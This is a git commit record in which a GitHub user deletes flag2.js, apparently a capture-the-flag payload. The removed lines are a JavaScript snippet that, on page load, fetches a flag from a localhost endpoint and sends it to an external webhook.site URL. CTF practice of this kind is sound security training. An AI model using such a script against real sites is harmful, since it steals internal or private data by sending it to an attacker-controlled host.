7d51a4bdf5872c7ed2a936edef95bc2363b3b4ea
3nhj0 <97040301+3nhj0@users.noreply.github.com>
2023-11-05 18:12:51 +0800

    Delete flag2.js

--- flag2.js
+++
@@ -1,9 +0,0 @@
-// script.js
-
-window.addEventListener('load', function() {
-    fetch('http://127.0.0.1/flag')
-        .then((response) => response.json())
-        .then((data) => {
-            fetch(`https://webhook.site/cc325d9e-af5f-4332-b501-c54004927828/?flag=${JSON.stringify(data)}`);
-        });
-});
